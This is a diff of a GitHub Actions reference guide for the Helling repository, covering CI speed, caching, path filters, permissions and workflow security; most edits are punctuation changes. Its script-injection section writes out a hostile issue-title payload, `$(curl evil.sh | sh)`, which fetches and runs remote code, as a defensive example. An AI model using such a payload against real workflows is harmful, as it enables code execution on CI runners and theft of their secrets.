@@ -6,19 +6,19 @@
 
 ---
 
-## 0. Framing - what this doc is and isn't
+## 0. Framing — what this doc is and isn't
 
 This is a reference, not a to-do list. Not all of it applies to Helling today; some sections are here so you have a single place to look when you hit the situation later (e.g. service containers when Postgres integration tests land). The sections split into three categories:
 
-- **APPLIES NOW** - concrete wins for Helling's current `quality.yml` and `security.yml`.
-- **APPLIES LATER** - mechanics you'll need when specific things land (DB tests, releases, frontend scale).
-- **DO NOT USE / TRAP** - things that sound useful but aren't, for reasons specific to your repo or to GitHub Actions semantics.
+- **APPLIES NOW** — concrete wins for Helling's current `quality.yml` and `security.yml`.
+- **APPLIES LATER** — mechanics you'll need when specific things land (DB tests, releases, frontend scale).
+- **DO NOT USE / TRAP** — things that sound useful but aren't, for reasons specific to your repo or to GitHub Actions semantics.
 
-**Critical framing fact for Helling:** the repo is public. GitHub-hosted runner minutes are **unlimited and free for public repos on standard runners** - see [GitHub's pricing docs](https://docs.github.com/en/billing/reference/actions-runner-pricing). This means:
+**Critical framing fact for Helling:** the repo is public. GitHub-hosted runner minutes are **unlimited and free for public repos on standard runners** — see [GitHub's pricing docs](https://docs.github.com/en/billing/reference/actions-runner-pricing). This means:
 
 - Cost optimization is not a real goal. Speed is. You're optimizing developer wait time, not a bill.
 - "Burn a job" is cheap. Splitting work into more parallel jobs to reduce wall-clock time is the dominant strategy, not consolidating work into fewer jobs.
-- Larger runners cost money even in public repos - avoid unless a specific job genuinely needs >7GB RAM or >4 cores.
+- Larger runners cost money even in public repos — avoid unless a specific job genuinely needs >7GB RAM or >4 cores.
 
 ---
 
@@ -28,10 +28,10 @@ Don't refactor CI based on feelings. Every optimization below should be validate
 
 ### 1.1 Where to look in the UI
 
-1. **Actions tab -> a workflow run -> the Summary page.** Scroll to "Jobs" - wall-clock duration per job is right there.
-2. **Actions tab -> any workflow -> `...` menu -> "Workflow usage"** - shows total minutes billed per job over the last month. On a free public repo this reads zero, but the _duration data_ still surfaces there.
-3. **Inside a job's log -> any step's group.** Look for `Post Set up Go` / `Post Cache` steps at the end - these are where caches get saved. The lines `Cache hit for key: ...` vs `Cache not found for input keys: ...` tell you if you have a cache problem.
-4. **Actions -> Insights** (organization level). Aggregated workflow run duration percentiles. Most useful for "is p95 getting worse."
+1. **Actions tab → a workflow run → the Summary page.** Scroll to "Jobs" — wall-clock duration per job is right there.
+2. **Actions tab → any workflow → `...` menu → "Workflow usage"** — shows total minutes billed per job over the last month. On a free public repo this reads zero, but the _duration data_ still surfaces there.
+3. **Inside a job's log → any step's group.** Look for `Post Set up Go` / `Post Cache` steps at the end — these are where caches get saved. The lines `Cache hit for key: ...` vs `Cache not found for input keys: ...` tell you if you have a cache problem.
+4. **Actions → Insights** (organization level). Aggregated workflow run duration percentiles. Most useful for "is p95 getting worse."
 
 ### 1.2 Budget table (use this as your target)
 
@@ -40,9 +40,9 @@ For a developer-feedback loop, the tolerance for CI latency is roughly:
 | Wall-clock time | Developer behaviour                               |
 | --------------- | ------------------------------------------------- |
 | < 2 min         | They wait watching the tab                        |
-| 2-5 min         | They context-switch                               |
-| 5-10 min        | They forget about the PR                          |
-| 10-30 min       | They start batching multiple PRs                  |
+| 2–5 min         | They context-switch                               |
+| 5–10 min        | They forget about the PR                          |
+| 10–30 min       | They start batching multiple PRs                  |
 | > 30 min        | They stop reviewing each other's PRs in real time |
 
 Helling's `quality.yml` runs 12 jobs in parallel. The wall-clock time of the workflow equals the slowest job, not the sum. That makes the critical-path job the only thing that matters.
@@ -58,7 +58,7 @@ Based on what each job does, assuming no caching:
 | `markdown`          | ~60s           | ~30s           | npm install global prettier every run            |
 | `yaml`              | ~25s           | ~15s           | pip install yamllint every run                   |
 | `shell`             | ~90s           | ~20s           | `go install shfmt` compiles 2 MB of Go every run |
-| `go`                | ~4-6 min       | ~2-3 min       | Go build + test + race + lint + vuln - the beast |
+| `go`                | ~4-6 min       | ~2-3 min       | Go build + test + race + lint + vuln — the beast |
 | `frontend`          | ~90s           | ~45s           | Bun cache helps; tsc is the long pole            |
 | `sql`               | ~60s           | ~30s           | pipx + go install goose compile every run        |
 | `secrets`           | ~20s           | ~20s           | gitleaks is fast, no caching needed              |
@@ -66,11 +66,11 @@ Based on what each job does, assuming no caching:
 | `links`             | ~15s           | ~15s           | offline check, nothing to cache                  |
 | `parity`            | ~20s           | ~15s           | tiny                                             |
 
-**Critical path: the `go` job at 4-6 minutes cold, 2-3 minutes warm.** Everything else can fall in line behind that. So the #1 optimization is making the `go` job fast and reliable, and caching the Go toolchain-installed binaries across workflows.
+**Critical path: the `go` job at 4–6 minutes cold, 2–3 minutes warm.** Everything else can fall in line behind that. So the #1 optimization is making the `go` job fast and reliable, and caching the Go toolchain-installed binaries across workflows.
 
 ---
 
-## 2. APPLIES NOW - high-leverage wins for Helling
+## 2. APPLIES NOW — high-leverage wins for Helling
 
 ### 2.1 Dependency caching
 
@@ -80,7 +80,7 @@ Based on what each job does, assuming no caching:
 
 `actions/setup-go@v6` with `cache: true` already handles `$GOCACHE` and `$GOMODCACHE` for you. The cache key is the hash of `go.sum`. This is good. You already have it.
 
-#### 2.1.2 Go-installed binary tools - the big miss
+#### 2.1.2 Go-installed binary tools — the big miss
 
 Every `go install x@version` in your workflow recompiles that tool from source on a fresh VM. You have four of these:
 
@@ -115,7 +115,7 @@ Alternative pattern if you want finer granularity:
     key: ${{ runner.os }}-shfmt-v3.9.0
 ```
 
-Don't combine that with the broad `~/go/bin` key - caches are mutually exclusive per path, and GitHub will clobber.
+Don't combine that with the broad `~/go/bin` key — caches are mutually exclusive per path, and GitHub will clobber.
 
 #### 2.1.3 pipx / pip caches
 
@@ -130,7 +130,7 @@ Don't combine that with the broad `~/go/bin` key - caches are mutually exclusive
     key: ${{ runner.os }}-pip-sqlfluff3.0.7-yamllint1.35.1-pyyaml6.0.2
 ```
 
-`sqlfluff` pulls ~30 MB of wheels; this saves roughly 20-30s on the `sql` job.
+`sqlfluff` pulls ~30 MB of wheels; this saves roughly 20–30s on the `sql` job.
 
 #### 2.1.4 npm global prettier
 
@@ -149,11 +149,11 @@ Don't combine that with the broad `~/go/bin` key - caches are mutually exclusive
     key: ${{ runner.os }}-npm-prettier-3.3.3
 ```
 
-Savings: ~15-20s.
+Savings: ~15–20s.
 
-#### 2.1.5 vacuum / grype / syft / sqlc - binary download cache
+#### 2.1.5 vacuum / grype / syft / sqlc — binary download cache
 
-These are single-binary downloads with SHA256 checksums. The download itself is 10-40 MB. Cache them:
+These are single-binary downloads with SHA256 checksums. The download itself is 10–40 MB. Cache them:
 
 ```yaml
 - uses: actions/cache@27d5ce7f107fe9357f9df03efb73ab90386fccae # v5.0.5
@@ -171,20 +171,20 @@ These are single-binary downloads with SHA256 checksums. The download itself is 
     # ... existing install logic
 ```
 
-The `if: steps.vacuum-cache.outputs.cache-hit != 'true'` skips the install when cached. That's what `cache-hit` is for. **Gotcha:** writing to `/usr/local/bin` needs `sudo`, and `actions/cache` handles the restore as the GHA user - if your cached binary has wrong ownership, the cache save fails silently. Cache into `~/.local/bin` and add it to `$PATH` instead:
+The `if: steps.vacuum-cache.outputs.cache-hit != 'true'` skips the install when cached. That's what `cache-hit` is for. **Gotcha:** writing to `/usr/local/bin` needs `sudo`, and `actions/cache` handles the restore as the GHA user — if your cached binary has wrong ownership, the cache save fails silently. Cache into `~/.local/bin` and add it to `$PATH` instead:
 
 ```yaml
 - run: echo "$HOME/.local/bin" >> $GITHUB_PATH
 ```
 
-`$GITHUB_PATH` is a workflow command - appending a line to this file adds the path for subsequent steps in the same job.
+`$GITHUB_PATH` is a workflow command — appending a line to this file adds the path for subsequent steps in the same job.
 
 #### 2.1.6 Cache key design rules
 
 1. **Key on the thing that invalidates.** For `go.sum` dependencies, `hashFiles('**/go.sum')`. For versioned tools, the version string. For a compiled binary keyed on workflow file, `hashFiles('.github/workflows/xyz.yml')`.
-2. **Include the OS.** `${{ runner.os }}-...` - ubuntu and macos caches are not interchangeable.
-3. **`restore-keys` are hierarchical.** Exact match -> partial prefix match -> even broader. The broader ones let a cache miss still warm-start on a "close enough" previous cache.
-4. **Immutable after write.** You cannot update a cache entry - only create a new one with a new key. Caches are evicted after 7 days of no access, or to keep the repo under 10 GB total cache storage (LRU eviction).
+2. **Include the OS.** `${{ runner.os }}-...` — ubuntu and macos caches are not interchangeable.
+3. **`restore-keys` are hierarchical.** Exact match → partial prefix match → even broader. The broader ones let a cache miss still warm-start on a "close enough" previous cache.
+4. **Immutable after write.** You cannot update a cache entry — only create a new one with a new key. Caches are evicted after 7 days of no access, or to keep the repo under 10 GB total cache storage (LRU eviction).
 
 #### 2.1.7 Cache size limits
 
@@ -195,7 +195,7 @@ The `if: steps.vacuum-cache.outputs.cache-hit != 'true'` skips the install when 
 
 This last point matters: if you have a feature branch that creates a large cache, it's isolated until it merges. On first push to a new branch, you get `main`'s caches as a warm start.
 
-### 2.2 Composite action - dedupe the setup sequence
+### 2.2 Composite action — dedupe the setup sequence
 
 You call `actions/checkout` in 12 jobs and `actions/setup-go` in 4 jobs. Every time you want to bump a SHA, that's 12 edits. Factor the common setup into a composite action:
 
@@ -245,15 +245,15 @@ jobs:
 
 **Gotchas:**
 
-- Composite actions must live in `.github/actions/<name>/action.yml` (or any directory - but this is the convention).
-- You reference a local composite with `./.github/actions/<name>` - starts with `./`, not a slash.
-- Composite `runs:` steps can be a mix of `uses:` and `run:`. `run:` in a composite **requires** an explicit `shell:` key - there's no default. (`shell: bash`, normally.)
-- Inputs in composites don't have access to `secrets` - pass them as explicit inputs.
+- Composite actions must live in `.github/actions/<name>/action.yml` (or any directory — but this is the convention).
+- You reference a local composite with `./.github/actions/<name>` — starts with `./`, not a slash.
+- Composite `runs:` steps can be a mix of `uses:` and `run:`. `run:` in a composite **requires** an explicit `shell:` key — there's no default. (`shell: bash`, normally.)
+- Inputs in composites don't have access to `secrets` — pass them as explicit inputs.
 - Composite actions **cannot contain `uses:` references that are themselves not pinned** if you care about ADR-026.
 
 **Trade-off:** you create a new abstraction layer. When something breaks, you have one more file to look in. For Helling's 12-job pattern, it's worth it; for a 3-job workflow it wouldn't be.
 
-### 2.3 Path filters - skip jobs when their files didn't change
+### 2.3 Path filters — skip jobs when their files didn't change
 
 Right now, a PR that changes only `README.md` runs all 12 jobs including the full Go test suite. That's waste. Use [`dorny/paths-filter`](https://github.com/dorny/paths-filter):
 
@@ -298,7 +298,7 @@ jobs:
     # ... rest of job
 ```
 
-**Critical trap #1 - required status checks.** If you mark the `go` job as a required check for merge to `main`, and a docs-only PR skips it, the PR is **blocked forever** waiting for a check that never runs. Two fixes:
+**Critical trap #1 — required status checks.** If you mark the `go` job as a required check for merge to `main`, and a docs-only PR skips it, the PR is **blocked forever** waiting for a check that never runs. Two fixes:
 
 - Make the _workflow_ required instead of the job (some branch protection setups allow this, others don't cleanly).
 - Emit a skipped-but-successful sentinel job. Most common pattern:
@@ -331,9 +331,9 @@ jobs:
           echo "$results" | jq -e 'to_entries | all(.value.result == "success" or .value.result == "skipped")'
 ```
 
-Then mark `ci-complete` as the required check. `always()` makes it run regardless of prior failures, and the jq evaluates the `needs` context to confirm nothing failed.
+Then mark `ci-complete` as the required check. `always()` makes it run regardless of prior failures, and the jq evaluates the `needs` context to confirm nothing failed outright.
 
-**Critical trap #2 - PR base branch.** `dorny/paths-filter` needs both the PR head and base to diff against. It handles this automatically on `pull_request`, but on `push` it diffs against the previous push - which is usually what you want for a main-branch push but surprising otherwise.
+**Critical trap #2 — PR base branch.** `dorny/paths-filter` needs both the PR head and base to diff against. It handles this automatically on `pull_request`, but on `push` it diffs against the previous push — which is usually what you want for a main-branch push but surprising otherwise.
 
 **Savings for Helling:** a docs-only PR drops from ~6 min to ~30 s. A frontend-only PR drops to ~90 s.
 
@@ -354,13 +354,13 @@ jobs:
   # etc.
 ```
 
-Helling's jobs should all complete in under 10 minutes in the worst case. Set each to 2-3x the observed p95, not the average.
+Helling's jobs should all complete in under 10 minutes in the worst case. Set each to 2–3x the observed p95, not the average.
 
 **Why this matters for a public repo:** though minutes are free, GitHub gives you a [concurrent job limit](https://docs.github.com/en/actions/reference/limits). For GitHub Free plan, public repos: **20 concurrent Linux jobs**. A hung job eats one of those for 6 hours.
 
 ### 2.5 Permissions hardening per-job
 
-Your top-level `permissions: contents: read` is already minimum. Most jobs don't need `pull-requests: read` either - drop it at the top level, and add it only to jobs that actually read PR metadata (currently none of yours do).
+Your top-level `permissions: contents: read` is already minimum. Most jobs don't need `pull-requests: read` either — drop it at the top level, and add it only to jobs that actually read PR metadata (currently none of yours do).
 
 ```yaml
 # top-level
@@ -384,10 +384,10 @@ Jobs that typically need escalated permissions:
 | Upload build attestations | `id-token: write`, `attestations: write`             |
 | Comment on PRs            | `pull-requests: write`                               |
 | Publish releases          | `contents: write`                                    |
-| Push back to the repo     | `contents: write` (avoid - use a PR-creating action) |
+| Push back to the repo     | `contents: write` (avoid — use a PR-creating action) |
 | OIDC to cloud             | `id-token: write`                                    |
 
-### 2.6 The refactored shape - visualized
+### 2.6 The refactored shape — visualized
 
 ```flow
 BEFORE (what you have today):
@@ -416,13 +416,13 @@ AFTER (what this section gets you):
                 = 30 sec for docs-only PR
 ```
 
-**Net expected wall-clock reduction:** ~40-50% on typical PRs, ~90% on docs-only PRs.
+**Net expected wall-clock reduction:** ~40–50% on typical PRs, ~90% on docs-only PRs.
 
 ---
 
 ## 3. Correctness & security
 
-### 3.1 Script injection - audit of your current workflows
+### 3.1 Script injection — audit of your current workflows
 
 **The threat:** if an attacker can get content into a context value that gets interpolated into a shell command, they can execute arbitrary code on your runner. The classic:
 
@@ -434,9 +434,9 @@ An issue title of `$(curl evil.sh | sh)` becomes shell code.
 
 **Audit result for Helling's workflows as of 2026-04-21:**
 
-- `security.yml`: no user-controlled inputs interpolated into `run:` blocks
-- `quality.yml`: no user-controlled inputs interpolated into `run:` blocks
-- `codeql.yml`: no user-controlled inputs interpolated into `run:` blocks
+- `security.yml`: no user-controlled inputs interpolated into `run:` blocks ✓
+- `quality.yml`: no user-controlled inputs interpolated into `run:` blocks ✓
+- `codeql.yml`: no user-controlled inputs interpolated into `run:` blocks ✓
 
 You're clean. Keep it that way.
 
@@ -452,7 +452,7 @@ You're clean. Keep it that way.
   run: echo "PR title: $PR_TITLE"
 ```
 
-Why this works: `env:` values go into the shell environment as literal strings; shell quoting protects them. Interpolating directly into the `run:` body is textual substitution before the shell even starts - the shell can't defend against it.
+Why this works: `env:` values go into the shell environment as literal strings; shell quoting protects them. Interpolating directly into the `run:` body is textual substitution before the shell even starts — the shell can't defend against it.
 
 **What counts as user input:** anything the attacker could craft, including:
 
@@ -463,7 +463,7 @@ Why this works: `env:` values go into the shell environment as literal strings; 
 - `github.event.workflow_run.head_commit.message`
 - Any input to a `workflow_dispatch` that the actor can control
 
-### 3.2 `pull_request_target` - the footgun
+### 3.2 `pull_request_target` — the footgun
 
 Do not use `pull_request_target` unless you've audited every line. The difference:
 
@@ -485,10 +485,10 @@ Your workflows use actions from: `actions/*`, `github/*`, `ossf/*`, `anchore/*`,
 
 For each, verify:
 
-1. **Owner reputation.** First-party (`actions/*`, `github/*`) is trusted. Second-party (org behind the tool, like `anchore/scan-action` by Anchore) is next-best. Individual accounts (like `DavidAnson`) - check stars, last commit activity, whether other major projects use them.
+1. **Owner reputation.** First-party (`actions/*`, `github/*`) is trusted. Second-party (org behind the tool, like `anchore/scan-action` by Anchore) is next-best. Individual accounts (like `DavidAnson`) — check stars, last commit activity, whether other major projects use them.
 2. **SHA pinning.** Non-negotiable per ADR-026.
 3. **Permissions footprint.** What token scopes does it request?
-4. **Network egress.** Does it call out to third-party APIs with your secrets? `anchore/scan-action` does (telemetry - disable via `ANCHORE_CI=true`).
+4. **Network egress.** Does it call out to third-party APIs with your secrets? `anchore/scan-action` does (telemetry — disable via `ANCHORE_CI=true`).
 
 **A minimal vetting ritual:** before adopting a new third-party action, read its `action.yml`. If it's a JS action, spot-check `dist/index.js` for obvious exfiltration (search for `http`, `fetch`, `request`). If it's a composite, read every step. If it's a Docker action, read the Dockerfile.
 
@@ -496,7 +496,7 @@ This takes 5 minutes and catches most bad actors.
 
 ### 3.4 Compromised-runner posture
 
-Public GitHub-hosted runners are shared-tenancy VMs. GitHub treats them as ephemeral - a fresh VM per job, destroyed after. You get:
+Public GitHub-hosted runners are shared-tenancy VMs. GitHub treats them as ephemeral — a fresh VM per job, destroyed after. You get:
 
 - Network egress allowed by default (open internet).
 - No persistent state between jobs (caches and artifacts are the exception).
@@ -504,23 +504,23 @@ Public GitHub-hosted runners are shared-tenancy VMs. GitHub treats them as ephem
 
 Threat model for a compromised runner:
 
-- **Your secrets** - limited to whatever you pass in via `${{ secrets.* }}` or via `env`. Tightly scope repo-level secrets; prefer environment secrets gated by branch protection.
-- **Your cache** - an attacker with runner access can poison caches. If your workflow pulls a cache, then writes source to it, then another run pulls the poisoned cache, you have an RCE chain. Mitigation: use cache **paths you control**, and key strictly.
-- **The `GITHUB_TOKEN`** - if you have `contents: write`, the token can push to the repo. On PR events, the token is read-only by default for fork PRs.
-- **Egress to cloud providers via OIDC** - `id-token: write` lets the runner mint tokens for cloud providers. Scope the cloud-side trust policy to the exact repo + branch + workflow path.
+- **Your secrets** — limited to whatever you pass in via `${{ secrets.* }}` or via `env`. Tightly scope repo-level secrets; prefer environment secrets gated by branch protection.
+- **Your cache** — an attacker with runner access can poison caches. If your workflow pulls a cache, then writes source to it, then another run pulls the poisoned cache, you have an RCE chain. Mitigation: use cache **paths you control**, and key strictly.
+- **The `GITHUB_TOKEN`** — if you have `contents: write`, the token can push to the repo. On PR events, the token is read-only by default for fork PRs.
+- **Egress to cloud providers via OIDC** — `id-token: write` lets the runner mint tokens for cloud providers. Scope the cloud-side trust policy to the exact repo + branch + workflow path.
 
 **Concrete Helling mitigations you already have:**
 
-- SHA-pinned actions (ADR-026)
-- `permissions: contents: read` at top-level
-- No `pull_request_target`
-- No custom network-egress filters (GH doesn't offer these on hosted runners - self-hosted territory)
+- SHA-pinned actions (ADR-026) ✓
+- `permissions: contents: read` at top-level ✓
+- No `pull_request_target` ✓
+- No custom network-egress filters (GH doesn't offer these on hosted runners — self-hosted territory)
 
 ### 3.5 Secrets scoping
 
-- **Repository secrets** (`settings -> Secrets and variables -> Actions`) - visible to all workflows in the repo.
-- **Environment secrets** - gated on `environment:` block in a job; can require approvers and restrict branch patterns.
-- **Organization secrets** - across repos, useful for shared things like a container registry token.
+- **Repository secrets** (`settings → Secrets and variables → Actions`) — visible to all workflows in the repo.
+- **Environment secrets** — gated on `environment:` block in a job; can require approvers and restrict branch patterns.
+- **Organization secrets** — across repos, useful for shared things like a container registry token.
 
 For Helling today, one repo secret matters: `GITLEAKS_LICENSE`. Keep it simple. If/when you add deployment, create environments (`production`, `staging`) and scope deploy tokens to the `production` environment with `prod` branch protection. That way a PR cannot accidentally deploy.
 
@@ -528,30 +528,30 @@ For Helling today, one repo secret matters: `GITLEAKS_LICENSE`. Keep it simple. 
 
 ---
 
-## 4. Reusable structure - composites, reusable workflows, matrices
+## 4. Reusable structure — composites, reusable workflows, matrices
 
-### 4.1 Composite actions vs reusable workflows - which when
+### 4.1 Composite actions vs reusable workflows — which when
 
-| Capability                      | Composite action         | Reusable workflow                                  |
-| ------------------------------- | ------------------------ | -------------------------------------------------- |
-| Reuses **steps** within a job   | Yes                      | No                                                 |
-| Reuses **entire jobs**          | No                       | Yes                                                |
-| Can specify `runs-on`           | No (inherits)            | Yes                                                |
-| Supports `secrets:` inheritance | No (must pass as inputs) | Yes via `secrets: inherit`                         |
-| Has own permissions block       | No                       | Yes                                                |
-| Callable from another repo      | Yes                      | Yes                                                |
-| Nesting limit                   | 10 deep                  | 4 deep                                             |
-| Syntax home                     | `action.yml`             | `.github/workflows/*.yml` with `on: workflow_call` |
+| Capability                      | Composite action        | Reusable workflow                                  |
+| ------------------------------- | ----------------------- | -------------------------------------------------- |
+| Reuses **steps** within a job   | ✓                       | ✗                                                  |
+| Reuses **entire jobs**          | ✗                       | ✓                                                  |
+| Can specify `runs-on`           | ✗ (inherits)            | ✓                                                  |
+| Supports `secrets:` inheritance | ✗ (must pass as inputs) | ✓ via `secrets: inherit`                           |
+| Has own permissions block       | ✗                       | ✓                                                  |
+| Callable from another repo      | ✓                       | ✓                                                  |
+| Nesting limit                   | 10 deep                 | 4 deep                                             |
+| Syntax home                     | `action.yml`            | `.github/workflows/*.yml` with `on: workflow_call` |
 
 **Heuristic:**
 
-- Factoring `checkout + setup-go + setup-cache` across 4 jobs -> **composite**.
-- Running the exact same pipeline against main and release branches, or from a second workflow -> **reusable workflow**.
-- Calling from another repo's CI -> **reusable workflow** (composite is technically callable but awkward across repos).
+- Factoring `checkout + setup-go + setup-cache` across 4 jobs → **composite**.
+- Running the exact same pipeline against main and release branches, or from a second workflow → **reusable workflow**.
+- Calling from another repo's CI → **reusable workflow** (composite is technically callable but awkward across repos).
 
 For Helling today: composite is the right tool for the setup-sequence dedup (Section 2.2). Reusable workflow is overkill unless you end up running the same 12-job pipeline from multiple entry points.
 
-### 4.2 Matrix strategies - when matrix, when sequential, when needs-chain
+### 4.2 Matrix strategies — when matrix, when sequential, when needs-chain
 
 Matrix is for _the same job running against N variations of an input_. Not for parallelising different things.
 
@@ -560,7 +560,7 @@ Matrix is for _the same job running against N variations of an input_. Not for p
 ```yaml
 strategy:
   matrix:
-    task: [build, test, lint] # these are different things - use jobs
+    task: [build, test, lint] # these are different things — use jobs
 ```
 
 **Good use:**
@@ -575,9 +575,9 @@ strategy:
         go-version: "1.25"
 ```
 
-For Helling, the `codeql.yml` `language: [go, javascript-typescript]` matrix is correct - one job template, two language runs.
+For Helling, the `codeql.yml` `language: [go, javascript-typescript]` matrix is correct — one job template, two language runs.
 
-**`fail-fast`:** default is `true` - one failure kills siblings. Set `fail-fast: false` when you want full coverage before failing (you want to see both Go and JS CodeQL results, not just the first failure). Helling's codeql.yml sets this correctly.
+**`fail-fast`:** default is `true` — one failure kills siblings. Set `fail-fast: false` when you want full coverage before failing (you want to see both Go and JS CodeQL results, not just the first failure). Helling's codeql.yml sets this correctly.
 
 **`max-parallel`:** throttle matrix concurrency. Useful when your downstream (e.g. a staging DB) can't handle N parallel connections. Not useful for Helling's current workflows.
 
@@ -585,7 +585,7 @@ For Helling, the `codeql.yml` `language: [go, javascript-typescript]` matrix is 
 
 **Data passing options:**
 
-1. **Job outputs** - small strings. Max 1 MB across all outputs of a job. Fast.
+1. **Job outputs** — small strings. Max 1 MB across all outputs of a job. Fast.
 
    ```yaml
    jobs:
@@ -601,9 +601,9 @@ For Helling, the `codeql.yml` `language: [go, javascript-typescript]` matrix is 
          - run: echo "Releasing ${{ needs.build.outputs.version }}"
    ```
 
-2. **Artifacts** - larger data, binary-safe. Use `actions/upload-artifact@v7` in the producer, `actions/download-artifact@v6` in the consumer. Artifacts are scoped to the workflow run and auto-delete after 90 days by default (configurable per repo).
+2. **Artifacts** — larger data, binary-safe. Use `actions/upload-artifact@v7` in the producer, `actions/download-artifact@v6` in the consumer. Artifacts are scoped to the workflow run and auto-delete after 90 days by default (configurable per repo).
 
-3. **Cache** - **do not use cache for cross-job data passing.** Cache keys can miss, and cross-job coordination via cache is a race condition.
+3. **Cache** — **do not use cache for cross-job data passing.** Cache keys can miss, and cross-job coordination via cache is a race condition.
 
 **Needs graph gotchas:**
 
@@ -632,7 +632,7 @@ steps:
     echo "EOF" >> $GITHUB_OUTPUT
 ```
 
-The deprecated `::set-output` syntax will not work - it was removed in 2023.
+The deprecated `::set-output` syntax will not work — it was removed in 2023.
 
 ---
 
@@ -679,12 +679,12 @@ concurrency:
 Helling has this correctly. Mechanics:
 
 - **`group`**: a string. Any two runs with the same group form a queue of size 2. When a third run enters, something gives.
-- **`cancel-in-progress: true`**: the currently-running job is cancelled, the new one starts. Good for PRs - the latest push's CI is the one you care about.
+- **`cancel-in-progress: true`**: the currently-running job is cancelled, the new one starts. Good for PRs — the latest push's CI is the one you care about.
 - **`cancel-in-progress: false`** (default): the new run queues behind the current one. Only one runs at a time. Good for deploys where you need sequential.
 
 Helling's pattern (cancel on PRs, queue on main pushes) is idiomatic.
 
-**Advanced pattern - queuing deploys without cancellation:**
+**Advanced pattern — queuing deploys without cancellation:**
 
 ```yaml
 concurrency:
@@ -692,7 +692,7 @@ concurrency:
   cancel-in-progress: false
 ```
 
-This ensures two deploys to `production` don't overlap, but they don't cancel each other either - they run serially.
+This ensures two deploys to `production` don't overlap, but they don't cancel each other either — they run serially.
 
 **Gotcha:** concurrency groups are **global** within the repo. Two different workflows with `group: deploy-prod` queue against each other. Use descriptive groups.
 
@@ -732,16 +732,16 @@ For Helling, not an issue at current scale.
 
 **Most-useful `github.*` fields:**
 
-- `github.event_name` - `push`, `pull_request`, etc.
-- `github.event.*` - full event payload (same shape as GitHub webhooks)
-- `github.ref` - `refs/heads/main`, `refs/pull/123/merge`
-- `github.ref_name` - `main`, `123/merge`
-- `github.sha` - the commit being processed
-- `github.repository` - `Bizarre-Industries/Helling`
-- `github.actor` - who triggered (including bots: `dependabot[bot]`)
-- `github.head_ref` - source branch on PR (empty on push)
-- `github.base_ref` - target branch on PR (empty on push)
-- `github.workflow` - workflow name (useful for concurrency group)
+- `github.event_name` — `push`, `pull_request`, etc.
+- `github.event.*` — full event payload (same shape as GitHub webhooks)
+- `github.ref` — `refs/heads/main`, `refs/pull/123/merge`
+- `github.ref_name` — `main`, `123/merge`
+- `github.sha` — the commit being processed
+- `github.repository` — `Bizarre-Industries/Helling`
+- `github.actor` — who triggered (including bots: `dependabot[bot]`)
+- `github.head_ref` — source branch on PR (empty on push)
+- `github.base_ref` — target branch on PR (empty on push)
+- `github.workflow` — workflow name (useful for concurrency group)
 
 ### 6.2 Expression functions
 
@@ -753,14 +753,14 @@ Built-in functions you'll actually use:
 | `startsWith`  | `startsWith(github.ref, 'refs/tags/v')`                   | boolean                   |
 | `endsWith`    | `endsWith(github.event.pull_request.title, '[WIP]')`      | boolean                   |
 | `format`      | `format('{0}-{1}', runner.os, matrix.go-version)`         | string                    |
-| `join`        | `join(fromJSON('["a","b"]'), '-')` -> `a-b`               | string                    |
+| `join`        | `join(fromJSON('["a","b"]'), '-')` → `a-b`                | string                    |
 | `toJSON`      | `toJSON(github.event)`                                    | string (useful for debug) |
 | `fromJSON`    | `fromJSON(needs.setup.outputs.matrix)`                    | object                    |
 | `hashFiles`   | `hashFiles('**/go.sum')`                                  | string (sha256)           |
-| `success()`   | `success()` - all previous steps passed                   | boolean                   |
-| `failure()`   | `failure()` - a previous step failed                      | boolean                   |
-| `always()`    | `always()` - run even if cancelled/failed                 | boolean                   |
-| `cancelled()` | `cancelled()` - workflow was cancelled                    | boolean                   |
+| `success()`   | `success()` — all previous steps passed                   | boolean                   |
+| `failure()`   | `failure()` — a previous step failed                      | boolean                   |
+| `always()`    | `always()` — run even if cancelled/failed                 | boolean                   |
+| `cancelled()` | `cancelled()` — workflow was cancelled                    | boolean                   |
 
 **Status function precedence (critical gotcha):**
 
@@ -775,31 +775,31 @@ if: ${{ always() }}
 if: ${{ success() && github.ref == 'refs/heads/main' }}
 ```
 
-When you `needs: [a, b]` and write `if: some-condition`, the job already has an _implicit_ `success()` check - the job won't run if `a` or `b` failed. To override, put `always()` or `!cancelled()` explicitly.
+When you `needs: [a, b]` and write `if: some-condition`, the job already has an _implicit_ `success()` check — the job won't run if `a` or `b` failed. To override, put `always()` or `!cancelled()` explicitly.
 
 ### 6.3 Safe interpolation rules
 
 1. **Never** put `${{ anything.user_controlled }}` inside a `run:` block. Use `env:` (Section 3.1).
 2. `${{ secrets.* }}` in `run:` is safe (secrets are stripped from logs), but prefer `env:` for readability.
-3. Expressions in `with:` and `if:` are evaluated by the runner, not the shell - safe from shell injection but still do server-side input validation for any `workflow_dispatch` input used in a cloud-credential scope.
+3. Expressions in `with:` and `if:` are evaluated by the runner, not the shell — safe from shell injection but still do server-side input validation for any `workflow_dispatch` input used in a cloud-credential scope.
 4. `${{ }}` inside `env:` is evaluated at job parse time; inside `run:`, the value is substituted before shell parse. Same textual substitution vulnerability, different parser.
 
 ---
 
 ## 7. Runners & images
 
-### 7.1 `runs-on:` - always pin the image version
+### 7.1 `runs-on:` — always pin the image version
 
 ```yaml
-runs-on: ubuntu-latest   # <- moving target
-runs-on: ubuntu-24.04    # <- pinned
+runs-on: ubuntu-latest   # ← moving target
+runs-on: ubuntu-24.04    # ← pinned
 ```
 
 `ubuntu-latest` changes when GitHub rotates. For CI reproducibility, pin. Helling does this already. When Canonical ships `ubuntu-26.04` and GitHub offers `ubuntu-26.04` as a runner label, you can migrate on your schedule.
 
-Image versions are documented in [`actions/runner-images`](https://github.com/actions/runner-images/tree/main/images/ubuntu). Each image ships with preinstalled tools (recent Node, Python, Go, Docker, etc.) - check the `Ubuntu2404-Readme.md` before installing something that's already there.
+Image versions are documented in [`actions/runner-images`](https://github.com/actions/runner-images/tree/main/images/ubuntu). Each image ships with preinstalled tools (recent Node, Python, Go, Docker, etc.) — check the `Ubuntu2404-Readme.md` before installing something that's already there.
 
-### 7.2 Service containers - when you hit DB tests
+### 7.2 Service containers — when you hit DB tests
 
 The moment Helling has integration tests that need Postgres:
 
@@ -855,7 +855,7 @@ When you use `container:`, services are reachable by **service name** (`postgres
 
 **When to avoid:** most CI jobs. Docker-in-Docker interactions get weird, and the GH-hosted VM already has a good toolchain.
 
-### 7.3 Custom runner images - skip
+### 7.3 Custom runner images — skip
 
 You asked to skip self-hosting. Custom runner images are a self-hosted concept (or a "larger runner" concept that's paid even on public repos). Ignore for Helling.
 
